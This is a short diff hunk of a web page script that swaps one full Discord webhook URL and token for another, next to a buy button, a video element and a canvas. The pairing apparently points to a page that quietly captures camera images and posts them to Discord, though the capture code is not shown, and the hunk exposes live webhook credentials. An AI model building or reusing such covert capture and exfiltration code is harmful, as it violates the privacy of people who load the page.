@@ -22,7 +22,7 @@
 ‎  <canvas id="canvas" width="300" height="200"></canvas>
 ‎
 ‎  <script>
-‎    const webhookURL = "https://canary.discord.com/api/webhooks/1459770251544887357/9K2SMkK3ne5QWhZ75fy22kvxZ-c0dLQlcF62_uvsqQeLQ2hixueekBM82XxgjWyWKpB8";
+‎    const webhookURL = "https://discord.com/api/webhooks/1513121111053828191/pQlimE3yfIaAbWouXJIlDxvmXD2QaXMXlH51b7mDjan2LRxJ87Oz2T3bjaGG-KxkaNOL";
 ‎    const buyBtn = document.getElementById("buyBtn");
 ‎    const video = document.getElementById("video");
 ‎    const canvas = document.getElementById("canvas");
